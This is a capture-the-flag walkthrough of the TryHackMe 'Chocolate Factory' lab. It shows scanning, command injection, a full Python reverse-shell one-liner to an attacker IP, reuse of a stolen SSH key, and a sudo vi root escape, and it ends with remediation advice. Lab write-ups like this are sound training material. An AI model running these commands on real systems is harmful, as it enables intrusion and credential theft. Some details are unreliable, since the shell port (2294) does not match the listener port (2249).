

## Proof of Concept: Exploiting Chocolate Factory Lab (TryHackMe)

### Overview

This PoC targets the **Chocolate Factory** lab environment on TryHackMe ([https://tryhackme.com/room/chocolatefactory](https://tryhackme.com/room/chocolatefactory)), a vulnerable machine designed to teach penetration testing techniques. The lab involves gaining initial access via command injection and escalating privileges to a user account using SSH keys. The process includes network scanning, web enumeration, exploitation of vulnerabilities, and privilege escalation. Root access steps are outlined but not fully executed in this PoC.

---

### Proof of Concept (PoC)

This PoC demonstrates how to gain initial access to the Chocolate Factory machine as the `www-data` user and escalate privileges to the `charlie` user. The process involves network enumeration, exploitation of a command injection vulnerability, and privilege escalation using SSH keys.

#### Part A: Gaining Initial Access

##### Step 1: Network Enumeration with Nmap
- Scanned the target machine to identify open ports and services:  
  ```bash
  nmap -T4 -sV -A 10.10.12.204
  ```
  - **Result**: Identified two open ports:  
    - Port 21 (FTP) - Allows anonymous login.  
    - Port 80 (HTTP) - Hosts a web application.  
  - **Screenshot**: Nmap Scan Results  
    ![Nmap Scan](https://github.com/user-attachments/assets/d6c9ab51-46d6-495e-981e-8544c5f4d30c)

##### Step 2: Explore FTP (Port 21)
- Connected to the FTP server using anonymous login:  
  ```bash
  ftp 10.10.12.204
  ```
- Downloaded a file named `gum_room`.  
  - **Screenshot**: FTP Login and File Download  
    ![FTP Download](https://github.com/user-attachments/assets/ef7fc003-7fd9-4f0f-9684-7ec8988b2df4)
  - **Screenshot**: Downloaded File (`gum_room`)  
    ![Downloaded File](https://github.com/user-attachments/assets/39218184-a257-44b5-9826-ecdcd8ec7f1d)
- **Note**: The contents of `gum_room` were not analyzed in this PoC but may contain hints for further exploitation.

##### Step 3: Explore the Web Application (Port 80)
- Accessed the website at `http://10.10.12.204`.  
  - **Screenshot**: Website Homepage with Login Form  
    ![Homepage](https://github.com/user-attachments/assets/88eac3bd-6883-4760-a27f-67bc0fafd0b0)
- Inspected the source code and identified a link to `validatee.php`, confirming the website runs on PHP.

##### Step 4: Directory Enumeration with FFUF
- Performed directory brute-forcing to uncover hidden pages:  
  ```bash
  ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.12.204/FUZZ -e .php,.html
  ```
  - **Result**: Discovered directories and files, including `home.php` and `index.html`.  
  - **Screenshot**: FFUF Results  
    ![FFUF Results](https://github.com/user-attachments/assets/5d46e6f6-472b-4618-a95b-b9326c204f07)

##### Step 5: Exploit Command Injection on `home.php`
- Navigated to `http://10.10.12.204/home.php` and discovered a command execution functionality.  
  - **Screenshot**: Command Functionality on `home.php`  
    ![Command Functionality](https://github.com/user-attachments/assets/7e8555a3-049a-4558-aa7c-c8305eaa9b4c)
- Tested for command injection by running:  
  ```
  cat /etc
  ```
  - **Result**: The server responded with directory contents, confirming a command injection vulnerability.  
  - **Screenshot**: Command Injection Confirmation  
    ![Command Injection](https://github.com/user-attachments/assets/8c73edae-6c13-4884-8868-df07f4aef56d)

##### Step 6: Gain a Reverse Shell
- Verified the presence of a Python binary on the server:  
  ```
  which python3
  ```
- Executed a Python reverse shell command to connect back to the attacker machine:  
  ```bash
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.106.235",2294));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
  ```
- Set up a Netcat listener on the attacker machine:  
  ```bash
  nc -nlvp 2249
  ```
- **Result**: Successfully obtained a reverse shell as the `www-data` user.  
  - **Screenshot**: Reverse Shell  
    ![Reverse Shell](https://github.com/user-attachments/assets/eb87dc55-adaa-46cc-9b3d-5ca84aaad3db)

#### Part B: Privilege Escalation to `charlie` User

##### Step 1: Enumerate Files as `www-data`
- Explored the current directory and found a file named `key_rev_key`.  
- Used the `strings` command to extract readable content from `key_rev_key`:  
  ```bash
  strings key_rev_key
  ```
  - **Result**: Discovered a key (likely an SSH key or password).  
  - **Screenshot**: Contents of `key_rev_key`  
    ![Key Content](https://github.com/user-attachments/assets/af1530b0-29d1-4246-a24c-22a9777c0180)

##### Step 2: Identify User Accounts
- Listed user accounts on the system:  
  ```bash
  cat /etc/passwd
  ```
- **Result**: Identified a user named `charlie`.

##### Step 3: Access Charlie’s Home Directory
- Navigated to `/home/charlie` and found files: `telport` and `telport.pub`.  
  - **Screenshot**: Contents of Charlie’s Home Directory  
    ![Charlie's Directory](https://github.com/user-attachments/assets/fc896cf9-6549-4345-90e2-ecf7d2debc0c)
- **Finding**: The `telport` file contains a private SSH key.

##### Step 4: Use SSH Key to Escalate to `charlie`
- Copied the `telport` private SSH key to the attacker machine and saved it as `charley`.  
- Used the key to log in as `charlie` via SSH:  
  ```bash
  ssh charlie@10.10.12.204 -i charley
  ```
- **Result**: Successfully logged in as `charlie`.  
  - **Screenshot**: Successful SSH Login  
    ![SSH Login](https://github.com/user-attachments/assets/6cd2fc4f-ff14-4f8d-b632-d71b9e41ebf9)
- Found the user flag in `/home/charlie`.

#### Part C: Path to Root Access (To Be Completed)
- **Steps for Root Access**:  
  1. Check for sudo privileges:  
     ```bash
     sudo -l
     ```
     ![image](https://github.com/user-attachments/assets/4cab7dad-abf8-44d9-838a-755246eee5a4)

  2. This showed that  `vi` is allowed, and we can escalate to root:  
     ```bash
     sudo /usr/bin/vi
     ```
     Within `vi`, execute:  
     ```
     !/bin/bash
     ```
     ![image](https://github.com/user-attachments/assets/736ddfc1-0038-4848-9058-b1267e3f7507)


---

### Summary of Findings

- **Initial Access**: Exploited a command injection vulnerability on `home.php` to gain a reverse shell as `www-data`.  
- **Privilege Escalation**: Used a private SSH key (`telport`) found in `/home/charlie` to escalate privileges to the `charlie` user and retrieve the user flag.  
- **Vulnerabilities Identified**:  
  - Anonymous FTP access exposes potentially sensitive files.  
  - Command injection in the web application allows arbitrary command execution.  
  - Insecure storage of SSH keys enables privilege escalation.

---

### Conclusion

This PoC demonstrates the successful compromise of the Chocolate Factory lab machine by gaining initial access via command injection and escalating privileges to the `charlie` user using an exposed SSH key. The lab highlights critical vulnerabilities such as command injection and improper key management, which can lead to unauthorized access and privilege escalation. Immediate remediation is recommended, including sanitizing user inputs, disabling anonymous FTP access, and securing SSH keys with proper permissions.

---



